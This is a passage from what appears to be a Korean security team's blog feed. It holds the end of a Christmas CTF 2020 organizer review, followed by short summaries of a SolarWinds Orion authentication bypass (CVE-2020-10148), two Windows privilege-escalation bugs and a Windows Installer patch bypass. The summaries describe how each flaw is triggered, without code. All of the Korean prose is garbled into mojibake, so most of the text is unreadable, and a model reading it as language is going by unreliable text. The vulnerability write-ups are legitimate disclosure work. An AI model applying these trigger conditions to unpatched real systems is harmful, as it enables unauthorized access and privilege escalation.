í•˜ëŠ” ë¶€ë¶„ì´ ìˆì—ˆì„ í…ë°, ë‹¤ ë¶€ì¡±í•œ ì €ì˜ ê°œë°œì‹¤ë ¥ ë•Œë¬¸ì…ë‹ˆë‹¤.. </p><p>ë˜ í•˜ë‚˜ ë¬¸ì œëŠ”.. </p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image10.png"></p><blockquote><p>ì•„ë‹ˆ ë‹¤ ë§Œë“¤ì–´ë†“ê³  ìµìŠ¤ê°€ ì™œ ì•ˆë˜ëŠ”ë°!!!!!!!!!!!!!!!!!!!!!!!!!!</p></blockquote><p>ì›ë˜ ìµìŠ¤ì— í¬í•¨ë˜ëŠ” ê³¼ì • ì¤‘ í•˜ë‚˜ì˜€ë˜ <code>flag.txt</code> íŒŒì¼ openì„ í•¨ìˆ˜ê°€ ê³„ì† <code>ì‘ íŒŒì¼ ëª» ì—´ì—ˆì–´ ã…‹ã…‹</code> ë¥¼ ë±‰ëŠ”ë° ì´ê²Œ ë¬´ìŠ¨ ê²½ìš°ì§€? ì™œ íŒŒì¼ì„ ëª» ì—¬ëŠ” ê±°ì§€?? í˜¼ì£ë§í•˜ë©´ì„œ ìš•ë„ í•´ë³´ê³  ë‹¬ë˜ë„ ë³´ê³  ì—´ì‹¬íˆ ì‚½ì§ˆì„ í–ˆì§€ë§Œ ì›ì¸ì„ ì°¾ì§€ ëª»í•´ ê²°êµ­ ë°”ì´ë„ˆë¦¬ ë‚´ë¶€ì—ì„œ <code>flag.txt</code> ë¥¼ openë§Œ í•˜ê³  ìµìŠ¤ ê³¼ì • ì¤‘ ROP ì²´ì¸ì—ì„œ open ê³¼ì •ì„ ë¹¼ê³  file descriptorë¥¼ ì´ìš©í•´ flagë¥¼ ì¶œë ¥í•˜ëŠ” ê²ƒìœ¼ë¡œ íƒ€í˜‘ì„ ë³¼ ìˆ˜ë°–ì— ì—†ì—ˆìŠµë‹ˆë‹¤.</p><blockquote><p>í›„ì¼ë‹´<br>idioth : ã…‹ã…‹ã…‹ã…‹ ë„ˆ address book ìµìŠ¤ í•  ë•Œ ì§„ì§œ ë¬´ì„œì› ë˜ ê±° ì•„ëƒ<br>ë³¸ì¸ : ??? ì™œìš” ë‚˜ ì™œ<br>idioth : ëˆ„êµ¬ í•˜ë‚˜ ê±¸ë¦¬ë©´ ì§„ì§œ ì£½ëŠ”ë‹¨ í‘œì •ì´ì—ˆì–´<br>Fabu1ous : ã…‡ã…ˆ<br>ë³¸ì¸ :</p></blockquote><p>ì·¨ì•½ì ì„ ì°¾ê¸° ì–´ë µê²Œ ë§Œë“  ì´ìœ ê°€ diff patchë¥¼ ì´ìš©í•œ binary diffingìœ¼ë¡œ ì·¨ì•½ì ì„ ì°¾ì„ ìˆ˜ ìˆë„ë¡ ì˜ë„í•œ ê±°ì§€ë§Œ.. ê³„íšì— ì°¨ì§ˆì´ ìƒê²¨ diff patchë„ ì ìš©ì„ ëª»í•´ ê²°ê³¼ì ìœ¼ë¡œ ì¢‹ì§€ ì•Šì€ í€„ë¦¬í‹°ì˜ ì•„ì‰¬ìš´ ë¬¸ì œë¼ê³  ìƒê°í•©ë‹ˆë‹¤â€¦ </p><p>ê·¸ë ‡ê²Œ í•œ ë¬¸ì œë¥¼ ë§ˆë¬´ë¦¬í•˜ê³  ë³´ë‹ˆ,  ì™œ ì‹œì‘ë„ ì•ˆ í•œ ë‘ ë¬¸ì œê°€ ë‚¨ì•„ìˆê³  ì €ëŠ” ê¸°ë§ê³ ì‚¬ë¥¼ ëˆˆì•ì— ë‘ê³  ìˆëŠ” ê±¸ê¹Œìš”?</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image11.png"></p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image12.png"></p><blockquote><p>ì €ëŠ” ê·¸ë ‡ê²Œ.. í•™ì ì„ ë†“ì•„ì£¼ì—ˆìŠµë‹ˆë‹¤</p></blockquote><p>í•™ì ì„ í¬ê¸°í•œ ëŒ€ê°€ë¡œ ë‚˜ë¨¸ì§€ baby_RudOlPhì™€ picky_eaterë¥¼ êµ¬ìƒí•  ìˆ˜ ìˆì—ˆìŠµë‹ˆë‹¤. <em><del>ë“±ê°€êµí™˜ì˜ ë²•ì¹™</del></em></p><p>picky_eaterëŠ” idioth íŒ€ì¥ë‹˜ì˜ ì•„ì´ë””ì–´ë¥¼ ì™ ë¹¼ì™”ìŠµë‹ˆë‹¤. address bookê³¼ ê³ êµ°ë¶„íˆ¬í•˜ê³ ìˆë˜ ì €ë¥¼ ë¶ˆìŒí•˜ê²Œ ë´¤ì—ˆë‚˜ë´ìš”. â€œì´ê±° ë„¤ê°€ í• ë˜?â€ ë¼ë©° snake ê²Œì„ ì»¨ì…‰ì˜ ì•„ì´ë””ì–´ë¥¼ ì£¼ë”ë¼ê³ ìš”. ê·¸ ì •ë„ë¡œ ë¶ˆìŒí•´ ë³´ì˜€ë‚˜?;; ì•„ë¬´íŠ¼ ê°ì‚¬í•©ë‹ˆë‹¤ ã…ã…<br>ê·¸ë˜ë„ ë§Œë“¤ ë• ì¬ë°Œê²Œ ë§Œë“¤ì—ˆë˜ ë¬¸ì œì¸ ê²ƒ ê°™ìŠµë‹ˆë‹¤!</p><p>ë§ˆì§€ë§‰ baby_RudOlPhëŠ” ë‘ ì¤„ë¡œ ì„¤ëª…í•˜ê² ìŠµë‹ˆë‹¤. </p><blockquote><p>??? : (íšŒì˜ ë„ì¤‘) ë‹˜ë“¤ ìƒê°í•´ë³´ë‹ˆê¹Œ ë‰´ë¹„ìš© í¬ë„ˆë¸” ë¬¸ì œê°€ ì—†ëŠ”ë°ìš”?</p></blockquote><p>ê·¸ë˜ì„œ ë§Œë“¤ê²Œ ëœ ARM(AArch64) ROP ë¬¸ì œì…ë‹ˆë‹¤. ê·¸ëƒ¥ ë‚´ë©´ ì¬ë¯¸ì—†ì–ì•„ìš”! ê·¸ë˜ì„œ ARMì„ ë¼ì–¹ì—ˆì£ </p><p>(ì‚¬ì‹¤ ê¸°ê°„ ë‚´ì— ì›ë˜ ìƒê°í–ˆë˜ type confusion ë¬¸ì œë¥¼ ëª» ë§Œë“¤ ê²ƒ ê°™ì•„ì„œ ë‰´ë¹„ë¬¸ì œ ëƒˆë‹¤ëŠ” ê±´ ì•ˆ ë¹„ë°€)</p><p>ì •ë¦¬í•˜ê³  ë³´ë‹ˆê¹Œ ë” ì˜í•  ìˆ˜ ìˆì—ˆìŒì—ë„ ê·¸ëŸ¬ì§€ ëª»í•´ ì•„ì‰¬ìš´ ê°ì •ì´ ë§ì´ ë‚¨ëŠ” ëŒ€íšŒë¼ê³  ìƒê°ì´ ë“œë„¤ìš”. ë‚˜ì¤‘ì— ë‹¤ë¥¸ CTFì— ë¬¸ì œë¥¼ ì¶œì œí•  ìˆ˜ ìˆëŠ” ê¸°íšŒê°€ ì˜¬ì§„ ëª¨ë¥´ê² ì§€ë§Œ ê¸°íšŒê°€ ëœë‹¤ë©´ ë” ë§ì´, ì² ì €í•˜ê²Œ ì¤€ë¹„í•´ì„œ ì¢‹ì€ í€„ë¦¬í‹°ì˜ ë¬¸ì œë¥¼ ë§Œë“¤ ìˆ˜ ìˆë„ë¡ ë…¸ë ¥í•˜ê² ìŠµë‹ˆë‹¤. ë¶€ì¡±í•œ ì œ ë¬¸ì œë¥¼ í’€ì–´ì£¼ì‹  ëª¨ë“  ì°¸ê°€ì ì—¬ëŸ¬ë¶„ë“¤ê»˜ ê°ì‚¬ì˜ ë§ì”€ë“œë¦½ë‹ˆë‹¤..!</p><h1 id="Fabu1ous"><a href="#Fabu1ous" class="headerlink" title="Fabu1ous"></a>Fabu1ous</h1><ul><li>Oil-system &amp; Match-maker</li></ul><p><img src="/2021/01/03/idioth/christmasctf2020-review/image13.png"></p><p>ë²„ê·¸ ì¡ëŠ” ê±´ ì •ë§ í˜ë“  ì‘ì—…ì´êµ°ìš”. ëŒ€íšŒ ë•Œ oil-systemì˜ í’€ì´ ìˆ˜ê°€ 20ì´ë˜ë° ì•„ë§ˆ ëª¨ë‘ ì–¸ì¸í…ë””ë“œì¼ê±°ë¼ ìƒê°í•©ë‹ˆë‹¤. Match-makerë„ ë©”ëª¨ë¦¬ leak ì¤‘ ì–¸ì¸í…ë””ë“œê°€ í•œ ê°œ ìˆì—ˆìŠµë‹ˆë‹¤. ì†”ì§íˆ ì•„ì£¼ ì¡°ê¸ˆ ì–µìš¸í•œ ë¶€ë¶„ì´ ìˆì§€ë§Œ ê·¸ê²Œ ë¬´ìŠ¨ ì˜ë¯¸ê°€ ìˆê² ìŠµë‹ˆê¹Œâ€¦ ì´ëŸ° ìƒí™©ì´ ë°œìƒí•œ ì´ìœ ë¥¼ ì ì–´ë³´ê³  ì„±ì°°ì˜ ì‹œê°„ì´ë‚˜ ê°€ì ¸ë´…ì‹œë‹¤.</p><ol><li><p>ë±ìƒˆê°€ í™©ìƒˆë¥¼ ë”°ë¼ê°€ë©´ ë‹¤ë¦¬ê°€ ì°¢ì–´ì§„ë‹¤</p><p> ë¬¸ì œë¥¼ ë§Œë“¤ ë•Œê¹Œì§„ ëª°ëëŠ”ë° ì§€ê¸ˆ ë³´ë‹ˆ ì •ë§ ë³„ê±° ì—†ëŠ” ë¬¸ì œë”êµ°ìš”. í° í‹€ë§Œ ë³´ë©´ ë¦¬í„´ ê°’ì„ ì¡°ì‘í•´ <code>win()</code> í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ëŠ” ë¬¸ì œë“¤ê³¼ í¬ê²Œ ë‹¤ë¥¼ ê²Œ ì—†ìŠµë‹ˆë‹¤. í”íˆ ì•„ëŠ” ë§Œí¼ ë³´ì¸ë‹¤ê³  í•˜ì£ . ì–´ë ¤ìš´ ë¬¸ì œë¥¼ ë§Œë“¤ê² ë‹¤ëŠ” ì˜ìš•ì€ ì•ì„°ì§€ë§Œ ì‹¤ë ¥ì€ ì•ˆ ë”°ë¼ì£¼ê³  ê²°êµ­ ì“¸ë°ì—†ì´ ë³µì¡í•œ ë™ì‘ì„ í•˜ëŠ” ë¬¸ì œê°€ íƒ„ìƒí•œ ê±° ê°™ìŠµë‹ˆë‹¤.</p></li><li><p>ëŒë‹¤ë¦¬ë„ ë‘ë“¤ê²¨ ë³´ê³  ê±´ë„ˆë¼.</p><p> ìµœì¢… ê²€ì‚¬í•˜ì„¸ìš”. ë‘ ë²ˆ í•˜ì„¸ìš”. ìµœì¢… ê²€ì‚¬ì˜ ê²€ì‚¬ë„ í•˜ì„¸ìš”. ì´ë²ˆ ì‚¬ê±´ ì´í›„ë¡œ ì–´ë–¤ ì¼ì´ë“  ì‰½ê²Œ í™•ì‹ ì„ ê°–ì§„ ì•Šì„ ê²ƒ ê°™ìŠµë‹ˆë‹¤.</p></li></ol><ul><li>No g</li></ul><p>ì„¤ë¬¸ ì¡°ì‚¬ì— ì˜í•˜ë©´ ì´ë²ˆ ëŒ€íšŒì—ì„œ í˜¸ë¶ˆí˜¸ê°€ ê°€ì¥ ì‹¬í–ˆë˜ ë¬¸ì œë„¤ìš”. ì…œë¡í™ˆì¦ˆ ì•”í˜¸( ì¶¤ì¶”ëŠ” ì‚¬ëŒ ê·¸ë¦¼ ì•”í˜¸ )ì™€ ë¹„ìŠ·í•œ ëŠë‚Œìœ¼ë¡œ cryptoì™€ misc ê·¸ ì‚¬ì´ ì–´ë”˜ê°€ì˜ ë¬¸ì œë¥¼ ë§Œë“¤ë ¤ê³  í•´ ë´¤ìŠµë‹ˆë‹¤. No gë¼ëŠ” ì œëª©ì—ì„œ íŒíŠ¸ë¥¼ ì–»ì–´ ì‰½ê²Œ í‘¸ì‹  ë¶„ë“¤ë„ ìˆì§€ë§Œ ê·¸ëŸ¬ì§€ ëª»í•˜ê³  ê¸°ìƒì²œì™¸í•œ ì‚½ì§ˆì„ í•˜ì‹  ë¶„ë“¤ë„ ìˆë”êµ°ìš”. ê°€ë³ê²Œ miscë‚˜ í’€ë©´ì„œ ë¨¸ë¦¬ ì‹íˆë ¤ê³  ë´¤ë‹¤ê°€ ê³ í†µë°›ìœ¼ì‹  ë¶„ë“¤ê»˜ ì‚¬ì£„í•˜ê² ìŠµë‹ˆë‹¤. ã…ã…</p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image14.png"></p><p>ì£„ì†¡í•´ìš” ã… ã… ã… ã… ã… </p><p>2ë…„ ì—°ì† Christmas CTFì— ëŒ€í•´ ì•ˆ ì¢‹ì€ ê¸°ì–µë§Œ ë‚¨ë„¤ìš”. ì˜¬í•´ëŠ” ê¼­ ì—¬ì¹œ ì‚¬ê·€ì–´ì„œ Christmas CTF ë§ê³  ë°ì´íŠ¸í•˜ëŸ¬ ê°€ì•¼ê² ìŠµë‹ˆë‹¤. </p><p><img src="/2021/01/03/idioth/christmasctf2020-review/image15.png"></p><p><del>ì•„ì´ì”¨â€¦ ëˆ„ê°€ ì—¬ê¸°ë‹¤ ì–‘íŒŒë¥¼ ê°€ì ¸ë‹¤ ë†“ì€ ê±°ì•¼!?</del></p>]]></content>
    
    
    <categories>
      
      <category>Daily-Life</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>ctf</tag>
      
      <tag>idioth</tag>
      
      <tag>christmas ctf 2020</tag>
      
      <tag>L0ch</tag>
      
      <tag>review</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-10148: SolarWinds Orion API auth bypass to RCE</title>
    <link href="/2021/01/02/fabu1ous/2021-01-02/"/>
    <url>/2021/01/02/fabu1ous/2021-01-02/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://nvd.nist.gov/vuln/detail/CVE-2020-10148">CVE-2020-10148</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>2019.4 HF 6 ì´ì „ ë²„ì „</li><li>2020.2.1 HF 2 ì´ì „ ë²„ì „</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>SolarWinds Orion platformì—ì„œ API ì¸ì¦ ìš°íšŒë¥¼ í†µí•œ ì›ê²© ì½”ë“œ ì‹¤í–‰ ì·¨ì•½ì ì´ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤. FireEyeê°€ ì‘ë…„ 12ì›” ê³µê°œí•œ Sunburst backdoorë¡œ ì¸í•´ SolarWinds Orion platformì€ í° ì´ìŠˆê°€ ë˜ì—ˆìŠµë‹ˆë‹¤. ê·¸ í›„ SolarWinds Orion platformì— ëŒ€í•œ ê¹Šì€ ë¶„ì„ì´ ì§„í–‰ë˜ë©´ì„œ ë°œê²¬ëœ ì·¨ì•½ì  ì¤‘ í•˜ë‚˜ê°€ CVE-2020-10148ì…ë‹ˆë‹¤.</p><p>SolarWinds Orion platformì€ ì‹œìŠ¤í…œ ëª¨ë‹ˆí„°ë§ ë° ê´€ë¦¬ ëª©ì ìœ¼ë¡œ ë§Œë“¤ì–´ì§„ infrastructureì…ë‹ˆë‹¤. ì‚¬ìš©ìëŠ” Orion Websiteë¥¼ í†µí•´ ì„œë²„ì— ì„¤ì¹˜ëœ Orionì— ì ‘ê·¼í•´ ì„œë²„ë¥¼ ê´€ë¦¬í•  ìˆ˜ ìˆìœ¼ë©° SolarWinds Orion APIë¥¼ ìš”ì²­í•´ SolarWinds Orion platformì„ ì‚¬ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><p>URIë¥¼ í†µí•´ Orion ì„œë²„ì— ìš”ì²­ì„ ë³´ë‚¼ ë•Œ <code>Request.PathInfo</code> íŒŒë¼ë¯¸í„°ì— <code>WebResource.adx</code>, <code>ScriptResource.adx</code>, <code>i18n.ashx</code>, <code>Skipi18n</code>ë“±ì˜ ê°’ì„ ì§€ì •í•˜ë©´ SolarWindsê°€ <a href="https://docs.microsoft.com/en-us/dotnet/api/system.web.httpcontext.skipauthorization?view=netframework-4.8">SkipAuthorization</a> flagë¥¼ ì„¤ì •í•©ë‹ˆë‹¤. ì´ë¡œ ì¸í•´ í•´ì»¤ê°€ ì¸ì¦ ì ˆì°¨ë¥¼ ê±´ë„ˆë›°ê³  API ì»¤ë©˜ë“œë¥¼ ì‹¤í–‰í•  ìˆ˜ ìˆê²Œ ë©ë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>cve</tag>
      
      <tag>rce</tag>
      
      <tag>authentication bypass</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-17057 : Microsoft Windows Uninitialized Pointer EoP</title>
    <link href="/2021/01/01/l0ch/2021-01-01/"/>
    <url>/2021/01/01/l0ch/2021-01-01/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://blogs.360.cn/post/CVE-2020-17057%20detail%20and%20exploit.html">CVE-2020-17057 Microsoft Windows DirectComposition Uninitialized Pointer Privilege Escalation Vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Microsoft Windows</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>Microsoftê°€ 2ë…„ ì „ì— ë°œê²¬í•œ ì·¨ì•½ì ì„ íŒ¨ì¹˜í•¨ìœ¼ë¡œì¨ ì·¨ì•½ì ì˜ ì„¸ë¶€ ì •ë³´ê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. í•´ë‹¹ ì·¨ì•½ì ì€ Windows ì»¤ë„ ëª¨ë“œì˜ ê·¸ë˜í”½ êµ¬ì„± ìš”ì†Œì¸ <code>DirectComposition</code> ì—ì„œ ë°œìƒí•˜ëŠ” ì´ˆê¸°í™”ë˜ì§€ ì•Šì€ pool ë©”ëª¨ë¦¬ ì°¸ì¡°ì…ë‹ˆë‹¤.</p><p><code>DirectComposition</code> ì€ ë¦¬ì†ŒìŠ¤ ìƒì„±/í•´ì œ/ì†ì„± ì„¤ì • ë“±ì˜ ì‘ì—…ì„ ìˆ˜í–‰í•˜ëŠ” <code>NtDCompositionProcessChannelBatchBuffer</code> syscallì„ ì‚¬ìš©í•©ë‹ˆë‹¤.</p><p><code>DirectComposition::CInteractionTrackerMarshaler::SetBufferProperty</code> ì—ì„œëŠ” í•œ ìŒì˜ ë¦¬ì†ŒìŠ¤ ê°ì²´ë¥¼ ì²˜ë¦¬í•©ë‹ˆë‹¤. ì²« ë²ˆì§¸ ë¦¬ì†ŒìŠ¤ ê°ì²´ê°€ ì´ˆê¸°í™”ë˜ê³  ë‘ ë²ˆì§¸ ë¦¬ì†ŒìŠ¤ ê°ì²´ íƒ€ì…ì´ <code>0x57</code>ì´ ì•„ë‹ˆë¼ë©´ ë‘ ë²ˆì§¸ ë¦¬ì†ŒìŠ¤ ê°ì²´ê°€ ì´ˆê¸°í™”ë˜ì§€ ì•ŠìŠµë‹ˆë‹¤.</p><p>ì´í›„ <code>DirectComposition::CInteractionTrackerMarshaler::ReleaseManipulationReferences</code> ì—ì„œ í• ë‹¹ëœ í•œ ìŒì˜ ë¦¬ì†ŒìŠ¤ ê°ì²´ë¥¼ í•´ì œí•˜ê¸° ìœ„í•´ ë³„ë„ì˜ ê²€ì¦ ì—†ì´<code>DirectComposition::CApplicationChannel::ReleaseResource</code> ì„ í˜¸ì¶œí•˜ëŠ”ë°, ì´ë•Œ ì´ˆê¸°í™”ë˜ì§€ ì•Šì€ ë‘ ë²ˆì§¸ ë¦¬ì†ŒìŠ¤ ê°ì²´ í¬ì¸í„°ë¥¼ ì°¸ì¡°í•˜ê²Œ ë˜ì–´ ì»¤ë„ í¬ë˜ì‹œê°€ ë°œìƒí•©ë‹ˆë‹¤.</p><p>ì´ë¥¼ ì•…ìš©í•˜ë©´ ë¦¬ì†ŒìŠ¤ ê°ì²´ í¬ì¸í„° í…Œì´ë¸”ì„ spray í•´ ì„ì˜ ê°ì²´ë¥¼ í•´ì œí•˜ëŠ” ë“± í•´ì œëœ ë©”ëª¨ë¦¬ë¥¼ ì¡°ì‘í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>L0ch</tag>
      
      <tag>uninitialized pointer</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] CVE-2020-0986: Windows splWOW64 Elevation of Privilege</title>
    <link href="/2020/12/31/idioth/2020-12-31/"/>
    <url>/2020/12/31/idioth/2020-12-31/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://bugs.chromium.org/p/project-zero/issues/detail?id=2096">Issue 2096: Windows: splWOW64 Elevation of Privilege</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><ul><li>Windows 10 2004 (19041.508)</li></ul><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p>5ì›”ì— KasperskyëŠ” Windows splWOW64ì˜ Elevation of Privilegeê°€ ì•…ìš©ë˜ê³  ìˆìŒì„ ë°œê²¬í–ˆìŠµë‹ˆë‹¤. Microsoftì—ì„œ 6ì›”ì— íŒ¨ì¹˜ë¥¼ ë°œí‘œí–ˆì§€ë§Œ í•´ë‹¹ ì·¨ì•½ì ì€ ìˆ˜ì •ë˜ì§€ ì•Šì•˜ìŠµë‹ˆë‹¤.</p><p>CVE-2020-0986ì€ GDI Print/Print Spooler APIì˜ arbitrary pointer ì—­ì°¸ì¡° ì·¨ì•½ì ì…ë‹ˆë‹¤. ì´ ì·¨ì•½ì ì„ ì´ìš©í•˜ì—¬ low integrity í”„ë¡œì„¸ìŠ¤ëŠ” splwow64.exe(medium integrity)ì— LPC ë©”ì‹œì§€ë¥¼ ë³´ë‚´ splwow64ì˜ ë©”ëª¨ë¦¬ ì˜ì—­ì— ì“°ê¸° ê¶Œí•œì„ ì–»ì„ ìˆ˜ ìˆìŠµë‹ˆë‹¤. </p><p>splWOW64ëŠ” <code>GdiPrinterThunk</code>ë¡œ LPC ë©”ì‹œì§€ë¥¼ ì „ë‹¬í•©ë‹ˆë‹¤. <code>GdiPrinterThunk</code>ì˜ <code>INDEX_DocumnetEvent</code>ì— í•´ë‹¹ ì·¨ì•½ì ì´ í¬í•¨ë˜ì–´ ìˆìŠµë‹ˆë‹¤. <code>INDEX_DocumentEvent</code>ì˜ í•¸ë“¤ëŸ¬ëŠ” printer command(LPC í´ë¼ì´ì–¸íŠ¸ë¥¼ í†µí•´ ì¡°ì‘ ê°€ëŠ¥)ë¥¼ í†µí•´ ìœ íš¨í•œ í•¸ë“¤ì„ ê°€ì§„ í”„ë¦°í„°ì˜ ëª…ë ¹ì¸ì§€ í™•ì¸í•©ë‹ˆë‹¤.</p><p>í™•ì¸í•˜ê³  ë‚˜ë©´ <code>DecodePointer</code> í•¨ìˆ˜ë¥¼ ì‚¬ìš©í•˜ì—¬ <code>fpDocumnetEvent</code>ì˜ ì „ì—­ ë³€ìˆ˜ì— ì €ì¥ëœ í•¨ìˆ˜ì˜ í¬ì¸í„°ë¥¼ decode í•œ í›„ decode ëœ í¬ì¸í„°ë¥¼ í†µí•´ í•¨ìˆ˜ë¥¼ ì‹¤í–‰í•˜ê³  <code>memcpy</code>ë¥¼ í˜¸ì¶œí•©ë‹ˆë‹¤. í•´ì»¤ëŠ” <code>memcpy</code>ë¥¼ í†µí•´ ë³µì‚¬ë˜ëŠ” ë‚´ìš©ê³¼ ë°”ì´íŠ¸ ìˆ˜, destinationì„ ì œì–´í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><p>POC: <a href="https://bugs.chromium.org/p/project-zero/issues/attachment?aid=468393&amp;signed_aid=nGwe__E2zFBLc_iqlJ8lVQ==">https://bugs.chromium.org/p/project-zero/issues/attachment?aid=468393&amp;signed_aid=nGwe__E2zFBLc_iqlJ8lVQ==</a></p><p><a href="https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/">https://securelist.com/operation-powerfall-cve-2020-0986-and-variants/98329/</a></p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>eop</tag>
      
      <tag>idioth</tag>
      
      <tag>splwow64</tag>
      
      <tag>arbitrary pointer dereference</tag>
      
      <tag>lpc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[í•˜ë£¨í•œì¤„] Windows Installer EoP 6th patch bypass</title>
    <link href="/2020/12/30/fabu1ous/2020-12-30/"/>
    <url>/2020/12/30/fabu1ous/2020-12-30/</url>
    
    <content type="html"><![CDATA[<h2 id="URL"><a href="#URL" class="headerlink" title="URL"></a>URL</h2><p><a href="https://halove23.blogspot.com/2020/12/oh-so-you-have-antivirus-nameevery-bug.html">Disclosing about 8 0-day vulnerability</a></p><h2 id="Target"><a href="#Target" class="headerlink" title="Target"></a>Target</h2><p>Windows installer</p><h2 id="Explain"><a href="#Explain" class="headerlink" title="Explain"></a>Explain</h2><p><a href="https://hackyboiz.github.io/2020/10/21/fabu1ous/2020-10-21/">CVE-2020-16902</a>ì— ëŒ€í•œ íŒ¨ì¹˜ ìš°íšŒê°€ ê³µê°œë˜ì—ˆìŠµë‹ˆë‹¤. CVE-2019-1415ë¡œ ì²˜ìŒ ì œë³´ëœ Windows Installer EoP ì·¨ì•½ì ì˜ 6ë²ˆì§¸ íŒ¨ì¹˜ ìš°íšŒì…ë‹ˆë‹¤. </p><p>CVE-2020-16902ì˜ ë‚´ìš©ì€ ë‹¤ìŒê³¼ ê°™ìŠµë‹ˆë‹¤. Windows InstallerëŠ” ì„¤ì¹˜ ì‘ì—… ì‹¤íŒ¨ë¥¼ ëŒ€ë¹„í•´ ì„¤ì¹˜ ì‘ì—… ì¤‘ ì‚­ì œë˜ëŠ” íŒŒì¼ê³¼ ë¡¤ë°± ìŠ¤í¬ë¦½íŠ¸ë¥¼<code> C:\Config.Msi</code> ë””ë ‰í„°ë¦¬ì— ë°±ì—…í•©ë‹ˆë‹¤. ë°±ì—… ì „ì— <code>C:\Config.Msi</code> ë””ë ‰í„°ë¦¬ë¥¼ ì‚­ì œí•˜ê³  ì¬ìƒì„±í•˜ëŠ” ë¡œì§ì´ ìˆëŠ”ë° <code>Setsecurity()</code>ì˜ race condition ì·¨ì•½ì  íŒ¨í„´ì´ ë‚¨ì•„ìˆì–´ ì•…ìš©ì´ ê°€ëŠ¥í•©ë‹ˆë‹¤.</p><p>ë”°ë¼ì„œ <code>C:\Config.Msi</code>ë¥¼ ì‚­ì œí•˜ê³  <code>C:\Config.Msi</code>ì´ ì—¬ì „íˆ ì¡´ì¬í•œë‹¤ë©´(race-con íŠ¸ë¦¬ê±° ì¡°ê±´) <code>C:\Config.Msi</code> ëŒ€ì‹  <code>C:\windows\install\config.msi</code>ì— ë¡¤ë°± íŒŒì¼ì„ ë°±ì—…í•˜ë„ë¡ íŒ¨ì¹˜ë˜ì—ˆìŠµë‹ˆë‹¤. </p><p>í•˜ì§€ë§Œ ë‹¤ìŒê³¼ ê°™ì€ ì´ìœ ë¡œ ìš°íšŒê°€ ê°€ëŠ¥í•©ë‹ˆë‹¤. ë§Œì•½ <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\Folders\C:\Config.Msi</code> ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ê°€ ì¡´ì¬í•˜ë©´ ê·¸ëŒ€ë¡œ <code>C:\Config.Msi</code>ë¥¼ ë°±ì—…ì— ì‚¬ìš©í•©ë‹ˆë‹¤.  <code>C:\Config.Msi</code>ë¥¼ ì‚­ì œí•œ í›„ <code>C:\Config.Msi</code>ì˜ ì‚­ì œ ì—¬ë¶€ë¥¼ í•œë²ˆ ë” ì²´í¬í•œ ë‹¤ìŒ <code>HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Installer\Folders\C:\Config.Msi</code> ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ë¥¼ ì‚­ì œí•©ë‹ˆë‹¤.  <code>C:\Config.Msi</code>ê°€ ì‚­ì œëœ ì§í›„ <code>C:\Config.Msi</code>ë¥¼ ìƒì„±í•˜ë©´ ë ˆì§€ìŠ¤íŠ¸ë¦¬ í‚¤ê°€ ì‚­ì œë˜ì§€ ì•ŠìŠµë‹ˆë‹¤. Windows InstallerëŠ” <code>C:\Config.Msi</code>ë¥¼ ë°±ì—…ì— ì‚¬ìš©í•˜ê²Œ ë˜ê³  ì´ì „ ì·¨ì•½ì ë“¤ì„ ê·¸ëŒ€ë¡œ ì•…ìš©í•  ìˆ˜ ìˆìŠµë‹ˆë‹¤.</p>]]></content>
    
    
    <categories>
      
      <category>1day1line</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Fabu1ous</tag>
      
      <tag>eop</tag>
      
      <tag>windows</tag>
      
      <tag>toctou</tag>
      
      <tag>race condition</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[Write-Up] Christmas CTF 2020 - Match Maker</title>
    <link href="/2020/12/29/fabu1ous/match-maker/"/>
    <url>/2020/12/29/fabu1ous/match-maker/</url>
    
